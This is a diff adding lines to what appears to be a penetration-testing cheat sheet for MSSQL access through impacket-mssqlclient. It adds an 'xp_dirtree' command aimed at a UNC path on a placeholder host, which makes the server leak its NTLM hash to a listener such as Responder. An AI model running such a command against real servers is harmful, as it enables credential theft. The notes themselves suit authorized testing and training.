@@ -520,6 +520,13 @@ impacket-mssqlclient {USERNAME}:'{PASSWORD}'@{IP ADDRESS} -windows-auth
 # {IP ADDRESS}: IP Address of the Server
 # {USERNAME}:   User Authentication
 # {PASSWORD}:   Password Authentication
+
+# SQL SHELL
+sql> help
+
+# Responder Hash
+sql> xp_dirtree "\\{IP ADDRESS}\test"
+
 ```
 
 
